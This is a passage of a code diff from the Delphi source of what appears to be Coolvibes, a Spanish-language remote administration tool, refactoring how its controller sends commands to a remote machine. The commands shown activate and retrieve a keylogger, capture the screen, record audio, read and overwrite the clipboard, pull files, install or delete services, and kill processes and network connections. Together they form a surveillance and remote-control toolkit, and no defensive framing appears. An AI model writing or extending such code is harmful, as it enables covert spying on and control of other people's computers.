+  ConnectionWriteLn(Servidor, 'LISTARSERVICIOS');
 end;
 
 procedure TFormControl.DEtener1Click(Sender: TObject);
@@ -3332,7 +3405,7 @@ begin
   mslistviewitem := ListViewServicios.Selected;
   while Assigned(mslistviewitem) do
     begin
-      Servidor.Connection.Writeln('DETENERSERVICIO' + mslistviewitem.Caption);
+      ConnectionWriteLn(Servidor, 'DETENERSERVICIO' + mslistviewitem.Caption);
       mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -3349,7 +3422,7 @@ begin
   mslistviewitem := ListViewServicios.Selected;
   while Assigned(mslistviewitem) do
     begin
-      Servidor.Connection.Writeln('INICIARSERVICIO' + mslistviewitem.Caption);
+      ConnectionWriteLn(Servidor, 'INICIARSERVICIO' + mslistviewitem.Caption);
       mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -3365,7 +3438,7 @@ begin
   mslistviewitem := ListViewServicios.Selected;
   while Assigned(mslistviewitem) do
     begin
-      Servidor.Connection.Writeln('BORRARSERVICIO' + mslistviewitem.Caption);
+      ConnectionWriteLn(Servidor, 'BORRARSERVICIO' + mslistviewitem.Caption);
       mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -3411,7 +3484,7 @@ begin
       Exit;
     end;
   RutaSI := MultiEditInstalarServicio.Text;
-  Servidor.Connection.Writeln('INSTALARSERVICIO' + nombresi + '|' +
+  ConnectionWriteLn(Servidor, 'INSTALARSERVICIO' + nombresi + '|' +
     descripcionSI + '|' + rutaSi + '|');
   btnSiguienteInstalarServicio.Visible := False;
   BtnCancelarInstalarServicio.Visible := False;
@@ -3461,7 +3534,7 @@ begin
         begin
           Descarga := TDescargaHandler(mslistviewitem.Data);
           if (not Descarga.Transfering) and Descarga.es_descarga then
-            Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
+            ConnectionWriteLn(Servidor, 'RESUMETRANSFER|' + Descarga.Origen +
               '|' + IntToStr(Descarga.Descargado));
         end;
       mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
@@ -3638,7 +3711,7 @@ begin
       if ListViewVentanas.Selected = nil then
         MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
       else //Recibe el PID de la ventana con Handle
-        Servidor.Connection.Writeln('WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
+        ConnectionWriteLn(Servidor, 'WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -3761,7 +3834,7 @@ begin
       Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
       if Descarga.Origen = FileName then Exit;
     end;
-  Servidor.Connection.Writeln('GETFILE|' + FileName);
+  ConnectionWriteLn(Servidor, 'GETFILE|' + FileName);
 end;
 
 procedure TFormControl.AgregarDescargaEnCola(FileName: string; tamano: Integer);
@@ -3881,7 +3954,7 @@ begin
       SpeedButtonGuardarLog.Enabled := False;
       SpeedButtonActivarKeylogger.Enabled := False;
       SpeedButtonEliminarLog.Enabled := False;
-      Servidor.Connection.Writeln('ESTADOKEYLOGGER'); //nada mas mostrarnos obtenemos el estado del keylogge
+      ConnectionWriteLn(Servidor, 'ESTADOKEYLOGGER'); //nada mas mostrarnos obtenemos el estado del keylogge
     end;
 end;
 
@@ -3890,7 +3963,7 @@ begin
   if not Servidor.Connection.Connected then Exit;
   if not SpeedbuttonRecibirlog.Enabled then Exit;
   SpeedButtonRecibirLog.Enabled := False;
-  Servidor.connection.WriteLn('RECIBIRKEYLOGGER');
+  ConnectionWriteLn(Servidor, 'RECIBIRKEYLOGGER');
 end;
 
 procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
@@ -3899,18 +3972,18 @@ begin
   if (SpeedButtonActivarKeylogger.Caption = _('Activar Keylogger')) then
     begin
       if (EditLogName.Text <> '') then
-        Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|' + EditLogName.Text + '|')
+        ConnectionWriteLn(Servidor, 'ACTIVARKEYLOGGER|' + EditLogName.Text + '|')
       else
         SpeedButtonActivarKeylogger.Enabled := True;
     end
   else
-    Servidor.Connection.WriteLn('DESACTIVARKEYLOGGER|');
+    ConnectionWriteLn(Servidor, 'DESACTIVARKEYLOGGER|');
 
 end;
 
 procedure TFormControl.SpeedButtonEliminarLogClick(Sender: TObject);
 begin
-  Servidor.Connection.Writeln('ELIMINARLOGKEYLOGGER');
+  ConnectionWriteLn(Servidor, 'ELIMINARLOGKEYLOGGER');
 end;
 
 procedure TFormControl.CheckBoxOnlineKeyloggerClick(Sender: TObject);
@@ -3924,7 +3997,7 @@ procedure TFormControl.CheckBoxOnlineKeyloggerClick(Sender: TObject);
   end;
 begin
   if not Servidor.Connection.Connected then Exit;
-  Servidor.Connection.WriteLn('ONLINEKEYLOGGER|' + BooleanToStr(CheckBoxOnlineKeylogger.Checked, 'ACTIVAR', 'DESACTIVAR') + '|');
+  ConnectionWriteLn(Servidor, 'ONLINEKEYLOGGER|' + BooleanToStr(CheckBoxOnlineKeylogger.Checked, 'ACTIVAR', 'DESACTIVAR') + '|');
 end;
 
 procedure TFormControl.SpeedButtonGuardarLogClick(Sender: TObject);
@@ -3963,7 +4036,7 @@ end;
 procedure TFormControl.TabScreencapShow(Sender: TObject);
 begin
   if Servidor.Connection.connected then
-    Servidor.Connection.Writeln('DATOSCAPSCREEN');
+    ConnectionWriteLn(Servidor, 'DATOSCAPSCREEN');
   if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
     begin
       imgCaptura.Picture := nil; //Refrescamos
@@ -4034,7 +4107,7 @@ begin
       Delete(portapapeles, 1, Pos('|', PortaPapeles));
       tmp := Copy(portapapeles, 1, Pos('|', portapapeles) - 1);
       Delete(portapapeles, 1, Pos('|', PortaPapeles));
-      Servidor.Connection.Writeln(Tmp2+'F|' + tmp + '|' + EditPathArchivos.Text + extractfilename(tmp) + '|');
+      ConnectionWriteLn(Servidor, Tmp2+'F|' + tmp + '|' + EditPathArchivos.Text + extractfilename(tmp) + '|');
     end;
   btnactualizararchivos.Click;
 end;
@@ -4231,7 +4304,7 @@ begin
           if (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
             CurrentAtrib := CurrentAtrib + 'Lectura ';
 
-          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
+          ConnectionWriteLn(Servidor, 'CHATRIBUTOS|' + EditPathArchivos.Text +
             mslistviewitem.Caption + '|' + CurrentAtrib + '|');
           mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
         end;
@@ -4258,7 +4331,7 @@ begin
           if (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
             CurrentAtrib := CurrentAtrib + 'Lectura ';
 
-          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
+          ConnectionWriteLn(Servidor, 'CHATRIBUTOS|' + EditPathArchivos.Text +
             mslistviewitem.Caption + '|' + CurrentAtrib + '|');
           mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
         end;
@@ -4285,7 +4358,7 @@ begin
           if not (Pos(_('Lectura'), mslistviewitem.subitems[2]) > 0) then
             CurrentAtrib := CurrentAtrib + 'Lectura ';
 
-          Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
+          ConnectionWriteLn(Servidor, 'CHATRIBUTOS|' + EditPathArchivos.Text +
             mslistviewitem.Caption + '|' + CurrentAtrib + '|');
           mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
         end;
@@ -4309,7 +4382,7 @@ end;
 procedure TFormControl.Windir1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('GORUTA|WINDIR')
+    ConnectionWriteLn(Servidor, 'GORUTA|WINDIR')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -4317,7 +4390,7 @@ end;
 procedure TFormControl.Directoriodesistema1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('GORUTA|SYSDIR')
+    ConnectionWriteLn(Servidor, 'GORUTA|SYSDIR')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 
@@ -4326,7 +4399,7 @@ end;
 procedure TFormControl.Misdocumentos1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('GORUTA|DOCUMENTOS')
+    ConnectionWriteLn(Servidor, 'GORUTA|DOCUMENTOS')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -4334,7 +4407,7 @@ end;
 procedure TFormControl.Escritorio1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('GORUTA|ESCRITORIO')
+    ConnectionWriteLn(Servidor, 'GORUTA|ESCRITORIO')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -4342,7 +4415,7 @@ end;
 procedure TFormControl.ArchivosRecientes1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('GORUTA|RECIENTE')
+    ConnectionWriteLn(Servidor, 'GORUTA|RECIENTE')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -4351,7 +4424,7 @@ procedure TFormControl.Directoriodeinstalaciondecoolvibes1Click(
   Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('GORUTA|CURRENTDIR')
+    ConnectionWriteLn(Servidor, 'GORUTA|CURRENTDIR')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -4419,13 +4492,13 @@ begin
       editbuscar.Enabled := False;
       TabSheetBuscar.highlighted := True;
       TabFileManager.highlighted := True;
-      Servidor.Connection.WriteLn('STARTSEARCH|' + editbuscar.Text + '|');
+      ConnectionWriteLn(Servidor, 'STARTSEARCH|' + editbuscar.Text + '|');
     end
   else
     begin //Parar
       SpeedButtonBuscar.Enabled := False; //Para evitar que se pulse mas de una vez
       ParaDeBuscar := True;
-      Servidor.Connection.WriteLn('STOPSEARCH');
+      ConnectionWriteLn(Servidor, 'STOPSEARCH');
     end;
 end;
 
@@ -4546,7 +4619,7 @@ begin
   SpeedButtonClipBoard1.Enabled := False;
   if Servidor.Connection.Connected then
     begin
-      Servidor.Connection.Writeln('GETCLIP');
+      ConnectionWriteLn(Servidor, 'GETCLIP');
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -4561,7 +4634,7 @@ begin
       TempStr := MemoClipBoard.Text;
       TempStr := StringReplace(tempstr, #10, '|salto|', [rfReplaceAll]);
       TempStr := StringReplace(Tempstr, #13, '|salto2|', [rfReplaceAll]);
-      Servidor.Connection.Writeln('SETCLIP|' + TempStr);
+      ConnectionWriteLn(Servidor, 'SETCLIP|' + TempStr);
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -4616,7 +4689,7 @@ begin
       Bits := listviewaudioformato.selected.subitems[1];
       UltimoFormato := hz + '-' + canal + '-' + bits;
 
-      Servidor.connection.writeln('GETAUDIO|' + Spineditaudio.Text + '|' + hz + '-' + canal + '-' + bits + '|' + Copy(comboboxaudiodevices.Text, 1, 1) + '|');
+      ConnectionWriteLn(Servidor, 'GETAUDIO|' + Spineditaudio.Text + '|' + hz + '-' + canal + '-' + bits + '|' + Copy(comboboxaudiodevices.Text, 1, 1) + '|');
     end;
 end;
 
@@ -4629,7 +4702,7 @@ begin
   SpeedButtonListarAudio.Enabled := False;
   if Servidor.Connection.Connected then
     begin
-      Servidor.connection.writeln('GETADRIVERS');
+      ConnectionWriteLn(Servidor, 'GETADRIVERS');
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -5021,9 +5094,9 @@ begin
   if Servidor.Connection.Connected then
     begin
       if CheckBoxPuertos.Checked then
-        Servidor.Connection.Writeln('TCPUDP|TRUE')
+        ConnectionWriteLn(Servidor, 'TCPUDP|TRUE')
       else
-        Servidor.Connection.Writeln('TCPUDP|FALSE');
+        ConnectionWriteLn(Servidor, 'TCPUDP|FALSE');
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -5075,7 +5148,7 @@ begin
           while Assigned(mslistviewitem) do
             begin
               if mslistviewitem.Caption = 'TCP' then
-                Servidor.Connection.Writeln('TCPKILLCON|' + mslistviewitem.SubItems[0] + mslistviewitem.SubItems[1] + mslistviewitem.SubItems[2] + mslistviewitem.SubItems[3]);
+                ConnectionWriteLn(Servidor, 'TCPKILLCON|' + mslistviewitem.SubItems[0] + mslistviewitem.SubItems[1] + mslistviewitem.SubItems[2] + mslistviewitem.SubItems[3]);
               mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
           BtnRefrescarPuertos.Click;
@@ -5098,7 +5171,7 @@ begin
 
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[5]);
+              ConnectionWriteLn(Servidor, 'KILLPROC|' + mslistviewitem.SubItems[5]);
               mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
 
